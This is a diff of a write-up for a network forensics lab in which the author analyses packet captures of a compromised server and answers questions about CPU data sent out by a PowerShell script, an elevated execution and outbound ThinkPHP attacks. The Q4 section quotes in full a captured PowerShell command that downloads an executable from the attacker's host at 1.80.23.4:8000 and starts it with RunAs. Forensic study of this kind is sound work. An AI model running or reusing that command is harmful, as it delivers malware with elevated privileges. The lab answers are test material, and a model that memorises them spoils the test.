@@ -67,36 +67,37 @@ So even if the question says Unicode code point, in practice the expected lab an
 
 ### Q3 - The attacker executed commands to gather detailed system information, including CPU specifications, after gaining access. What is the exact model of the CPU identified by the attacker's script?
 
-I did not get this one straight from the PCAP alone.
-
-First I went back to the earlier exploit request and noticed that the PowerShell command was downloading and executing `1.ps1`, so at that point it was obvious that the CPU question was probably answered by the attacker’s script itself, not by guessing from generic traffic.
-
-
-<img width="1652" height="52" alt="immagine" src="https://github.com/user-attachments/assets/27adbca6-b2d9-4cf6-bd7d-0acdc3b8107c" />
-
-<img width="666" height="50" alt="immagine" src="https://github.com/user-attachments/assets/22099a75-1841-4f49-ba09-ae675cb25005" />
-
-So I extracted `1.ps1` and worked from there.
-At first the content was not immediately readable, so instead of wasting time on encoding issues I just took the practical route and decoded the Base64 content online.
-Once it was readable, the important part was clear: the script was collecting system information with
-```powershell id="n7f5ga"
-$cpuInfo = Get-WmiObject Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
-```
-<img width="2554" height="262" alt="immagine" src="https://github.com/user-attachments/assets/214fb35b-6e5a-44b0-86e4-c214b54a190d" />
-
-<img width="1305" height="916" alt="immagine" src="https://github.com/user-attachments/assets/4cd64ec7-b7e2-4f83-9fba-66d294ad486e" />
-
-That told me the script was not hardcoding the CPU model.
-It was querying the machine for it and then sending the collected data back out with a POST request.
-
-Only after seeing that in the script did I go back to the traffic and filter specifically on:
+Since I already knew the attacker/involved host from the previous questions, I filtered directly on the relevant HTTP traffic:
 ```text
-ip.addr == 1.80.23.4 && http.request.method == POST
+ip.addr == 1.80.23.4 && http
 ```
-That let me focus on the reporting step directly.
-From there I checked the returned output, and under the `Name` field the CPU model appears directly, which gave the answer.
+That was enough to reduce the noise.
+Then I inspected the first suspicious packets and the interesting one was a clear **POST** request from the compromised server to `1.80.23.4:8000`.
 
-<img width="1172" height="152" alt="immagine" src="https://github.com/user-attachments/assets/aeb37569-c86a-4f66-9ec9-bd295844e487" />
+<img width="1676" height="38" alt="immagine" src="https://github.com/user-attachments/assets/24cb210f-dcb5-489c-a666-e6ec907d28c4" />
+
+<img width="1156" height="245" alt="immagine" src="https://github.com/user-attachments/assets/2e818d9c-d1be-4b38-953d-2bcda2526f46" />
+
+Following that HTTP stream gave the answer almost immediately.
+The POST body already contained the collected system information, including the CPU field:
+```text
+Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz
+```
+
+<img width="1044" height="311" alt="immagine" src="https://github.com/user-attachments/assets/5d0c55a5-02d0-41ee-b4e7-c7bf7803df6b" />
+
+At that point I could also understand that those values did not appear randomly.
+The request had a PowerShell user-agent, so it was probably the output of some script.
+
+Only after that did it make sense to check how those values were collected.
+For completeness, I went back to the previous `GET /1.ps1`, followed that HTTP stream, and there the downloaded PowerShell script appeared as encoded content.
+
+<img width="1758" height="345" alt="immagine" src="https://github.com/user-attachments/assets/c11ed0ce-26b0-4d27-8b9b-7e8671c83d6a" />
+
+It looked unreadable at first, but the script itself showed it was Base64 decoded as UTF-8, so I just used a quick online Base64-to-UTF8 converter.
+
+<img width="1300" height="905" alt="immagine" src="https://github.com/user-attachments/assets/3d26ea9d-d18b-4fb4-a4cf-fa21c74ab341" />
+
 
 **Answer:** `Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz`
 
@@ -113,11 +114,55 @@ The result matched **Application Layer Protocol: DNS**, which is the sub-techniq
 
 ### Q4 - Understanding how malware initiates the execution of downloaded files is crucial for stopping its spread and execution. After downloading the file, the malware executed it with elevated privileges to ensure its operation. What command was used to start the process with elevated permissions?
 
-**Answer:** ``
+At this point I used the same idea again and isolated the **POST** requests, because I wanted a quick recap of what the compromised server was doing after the infection.
+POST traffic was the most useful here because the exploit commands were being sent in the request body, so it made more sense to focus there instead of looking through every HTTP packet.
+
+<img width="1560" height="324" alt="immagine" src="https://github.com/user-attachments/assets/bc85eb02-22ae-4bde-ad08-4ff72902ddad" />
+
+Before the long sequence of similar reporting packets, there was one request that looked different enough to check.
+Since the question was asking about elevated execution, this packet was a good candidate.
+
+I followed the HTTP stream and the command was visible directly inside the PHP `system()` call:
+```powershell
+powershell -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri http://1.80.23.4:8000/2.tx -OutFile C:\Windows\Temp\2.exe; Start-Process C:\Windows\Temp\2.exe -Verb RunAs}"
+```
+
+<img width="1759" height="422" alt="immagine" src="https://github.com/user-attachments/assets/6caf7710-1ecd-4724-bca6-3304404000ce" />
+
+`Start-Process` is a PowerShell cmdlet used to start a program or process.
+In this case, it launches the downloaded executable located at `C:\Windows\Temp\2.exe`.
+
+The important part is `-Verb RunAs`.
+In Windows, `RunAs` means “run this program as administrator”, so this is the part that tries to start the executable with elevated privileges.
+
+So the command was used to start the process with elevated permissions.
+
+**Answer:** `Start-Process C:\Windows\Temp\2.exe -Verb RunAs`
 
 ### Q5 - After compromising the server, the malware used it to launch a massive number of HTTP requests containing malicious payloads, attempting to exploit vulnerabilities on additional websites. What vulnerable PHP framework was initially targeted by these outbound attacks from the compromised server?
 
-**Answer:** ``
+I used a simpler filter here because I did not want to lose the general picture:
+```text
+ip.addr == 36.96.48.3
+```
+Since the question says the framework was **“initially”** targeted, I focused on the first outbound requests after the compromise instead of jumping too far ahead in the traffic.
+In those early requests, the URI already shows a very strong clue:
+```text
+/index.php?s=index/think\app/...
+```
+<img width="1009" height="278" alt="immagine" src="https://github.com/user-attachments/assets/7cb36d08-2c20-4358-99c8-5581bd8e2b8b" />
+
+The `think` reference in the path is the important part here.
+That pattern is strongly associated with **ThinkPHP**.
+
+> [!NOTE]
+> A framework is basically a ready-made structure developers use to build applications faster, instead of writing everything from scratch.
+> In PHP, common examples include Laravel, Symfony, CodeIgniter, Yii, CakePHP, ThinkPHP, and Drupal.
+> The useful thing during traffic analysis is that frameworks often leave recognizable traces in URLs, parameters, or payloads.
+> In this lab we also saw another strong framework clue earlier: some requests contained `drupal_ajax`, which clearly pointed to Drupal-related targeting.
+> Here, though, the question asks for the framework **initially** targeted, and the first relevant requests point to `think`, so the answer is ThinkPHP.
+
+**Answer:** `ThinkPHP`
 
 
 ### Q8 - Knowing the destination of the data being exfiltrated or reported by the malware helps in tracing the attacker and blocking further communications to malicious servers. The compromised server was used to report system performance metrics back to the attacker. What is the IP address and port number to which this data was sent?
